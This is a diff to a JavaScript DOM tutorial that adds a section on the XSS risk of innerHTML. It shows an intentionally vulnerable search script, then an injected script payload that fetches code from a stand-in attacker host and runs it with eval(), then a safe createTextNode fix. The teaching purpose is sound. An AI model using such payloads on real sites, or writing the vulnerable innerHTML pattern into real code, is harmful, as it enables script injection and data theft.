@@ -148,20 +148,109 @@ Note that the changes made in the console only update the DOM and do not modify 
 
 </div>
 
-## `innerHTML` 
+## Changing Content with `innerHTML` (DANGEROUS)
 
+You can update an element’s content using `innerHTML`, but this is risky because it exposes your page to **Cross-Site Scripting (XSS) attacks**.
 
-## Handling Events 
+:::info
 
-An **event** is something that happens on a web page, like a mouse click or a key press. We can use an **event listener** to detect when an event occurs and then react to it.  
+XSS (Cross-Site Scripting) occurs when attackers inject malicious scripts into your page. Since `innerHTML` treats user input as actual HTML, it can execute harmful code.
 
-The code below listens for a click on the `.check` button, then logs the value of the input field `.guess`.  
+:::
 
-```js
-document.querySelector('.check').addEventListener('click', function() {
-    console.log(document.querySelector('.guess').value);
+### The Security Risk
+
+Below are examples of vulnerable files:
+
+- [index.html](https://github.com/joseeden/joeden/tree/master/docs/021-Software-Engineering/010-Javascript/Projects/001-hello-world/005-Comp-Sci-List)  
+- [script.js](https://github.com/joseeden/joeden/tree/master/docs/021-Software-Engineering/010-Javascript/Projects/001-hello-world/005-Comp-Sci-List)  
+
+The HTML file is a basic webpage that includes an input field for searching courses and a button to trigger the search. 
+
+On the other hand, the Javascript code contains:
+
+```javascript title="script.js"
+document.querySelector(".search-course").addEventListener("click", function () {
+  let userInput = document.querySelector(".course-id-input").value;
+  let courseDetails = document.querySelector("#course-details");
+
+  // Vulnerable to XSS: Using innerHTML
+  courseDetails.innerHTML = `You searched for: ${userInput}`;
 });
-```  
+```
 
-An **event handler** is the function that runs when the event happens. In this case, it retrieves and logs the input value.  
+### Malicious Input Example
+
+Below is sample malicious code:
+
+```bash
+<script>
+  fetch('http://malicious-server.com/malicious-script.js')
+    .then(response => response.text())
+    .then(data => {
+      eval(data); // Dangerous: executes downloaded malicious code
+    });
+</script>
+```
+
+If an attacker enters this in the input field, `innerHTML` will interpret it as valid HTML.
+
+1. The injected `<script>` tag runs immediately when added to the page.
+2. It fetches JavaScript from a rogue server (`http://malicious-server.com/malicious-script.js`).
+3. The downloaded code executes using `eval()`.
+4. This allows the attacker to steal data, install malware, or compromise the system.
+
+:::info
+
+**Note:** Modern browsers have built-in XSS protection that blocks some malicious scripts, but relying on it is not a safe security practice.
+
+:::
+
+<div class="img-center">
+
+![](/gif/docs/js-dom-7.gif)
+
+</div>
+
+### DON'T USE `innerHTML`
+
+To prevent XSS attacks, always **sanitize user input** and **avoid using** `innerHTML` for displaying user data. Instead, use safer alternatives like `textContent` or create elements dynamically with `createElement()` and `appendChild()`. Always validate and sanitize data before inserting it into the DOM.
+
+```javascript
+let safeUserInput = document.createTextNode(userInput);   // Converts input into plain text
+courseDetails.appendChild(safeUserInput);                 // Safely adds text to the DOM
+```
+
+This ensures the input is treated as plain text, preventing execution of harmful scripts.
+
+## Parent and Child Elements  
+
+You can find an element's parent and children using `parentElement` and `children`.  
+
+```javascript
+let item = document.querySelectorAll("li")[1]; // Selects the second <li>
+console.log(item.parentElement); // Gets the parent <ul>
+console.log(item.parentElement.parentElement); // Gets the <body>
+console.log(document.body.children); // Lists all body children
+```
+
+This helps in dynamically modifying specific parts of the page.  
+
+- `parentElement` moves up one level in the hierarchy  
+- `children` retrieves all child elements  
+
+
+## Caching Selectors for Performance  
+
+Re-selecting elements repeatedly slows down performance. Instead, store them in variables.
+
+```javascript
+let header = document.querySelector("h1"); 
+header.innerHTML = "Cached H1";
+```
+
+Caching selectors reduces unnecessary lookups and improves efficiency.  
+
+- The browser looks up `<h1>` once and stores it  
+- Any future changes use the stored reference  
 
